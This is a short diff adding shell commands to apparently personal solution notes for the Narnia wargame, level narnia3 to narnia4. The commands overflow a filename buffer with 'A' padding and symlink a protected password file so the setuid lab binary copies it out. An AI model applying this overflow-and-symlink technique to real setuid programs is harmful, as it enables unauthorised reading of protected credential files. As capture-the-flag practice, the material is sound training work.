@@ -51,6 +51,17 @@ q
 whoami
 cat /etc/narnia_pass/narnia3
 
+# narnia3 -> narnia4
+vim narnia3.c
+mkdir $(python -c 'print "/tmp/" + "A"*27 + "/tmp"')
+cd $(python -c 'print "/tmp/" + "A"*27 + "/tmp"')
+objdump -d -M /narnia/narnia3
+ln -s /etc/narnia_pass/narnia4 output
+touch /tmp/output
+chmod 777 /tmp/output
+/narnia/narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/output
+
+
 
 
 
